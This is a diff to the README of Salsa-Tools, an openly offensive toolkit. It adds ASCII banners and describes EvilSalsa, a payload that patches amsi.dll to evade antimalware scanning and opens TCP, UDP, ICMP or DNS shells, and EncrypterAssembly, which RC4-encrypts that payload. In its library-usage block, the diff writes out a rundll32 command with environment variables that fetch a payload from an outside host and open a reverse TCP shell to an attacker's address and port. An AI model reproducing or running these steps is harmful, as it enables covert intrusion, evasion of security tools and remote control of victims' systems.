@@ -26,7 +26,8 @@ Salsa-Tools is made from three different  ingredients:
     - EncrypterAssembly
     - SalseoLoader
 And his behavior is as it follows:
-TODO CROQUIS
+
+
 
 ## Setup
 ### Requirements
@@ -34,13 +35,51 @@ TODO CROQUIS
  - Python 2.7       
 ### Running la Salsa
 #### Cooking EvilSalsa
-TODO INSERTAR FOTO DE LA EVILSALSA
+
+```
+   ___ __ __  ____  _            
+  /  _]  |  ||    || |           
+ /  [_|  |  | |  | | |           
+|    _]  |  | |  | | |___        
+|   [_|  :  | |  | |     |       
+|     |\   /  |  | |     |       
+|_____| \_/  |____||_____|       
+                                 
+  _____  ____  _     _____  ____ 
+ / ___/ /    || |   / ___/ /    |
+(   \_ |  o  || |  (   \_ |  o  |
+ \__  ||     || |___\__  ||     |
+ /  \ ||  _  ||     /  \ ||  _  |
+ \    ||  |  ||     \    ||  |  |
+  \___||__|__||_____|\___||__|__|
+  
+[+] That is our Payload
+                                 
+```
 
 EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.
 
 
 #### Mixing EncrypterAssembly and Evilsalsa
-TODO INSERTAR FOTO DE LA SALSA
+```
+  ______                             _            
+ |  ____|                           | |           
+ | |__   _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
+ |  __| | '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
+ | |____| | | | (__| |  | |_| | |_) | ||  __/ |   
+ |______|_| |_|\___|_|   \__, | .__/ \__\___|_|   
+     /\                   __/ | || |   | |        
+    /  \   ___ ___  ___ _|___/|_|| |__ | |_   _   
+   / /\ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |  
+  / ____ \\__ \__ \  __/ | | | | | |_) | | |_| |  
+ /_/    \_\___/___/\___|_| |_| |_|_.__/|_|\__, |  
+                                           __/ |  
+                                          |___/   
+			  
+ [+] Software that encrypts the payload using RC4
+ [+] We have the version in python and the version in .exe
+```
+
 EncrypterAssembly can be used as a Python script or as a Exe binary.
 It encrypts the previously generated EvilSalsa.
 
@@ -61,7 +100,12 @@ SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
 ```
 Library usage:
 ```
-TODO NO TENGO NI IDEA DE QUE POENR AQUI LUIS XDD
+set $env:pass="password"
+set $env:payload="http://10.10.10.10/evil.txt"
+set $env:lhost="10.10.10.10"
+set $env:lport="1337"
+set $env:shell="reversetcp"
+rundll32.exe SalseoLoader.dll,main
 ```
 
 ## Examples
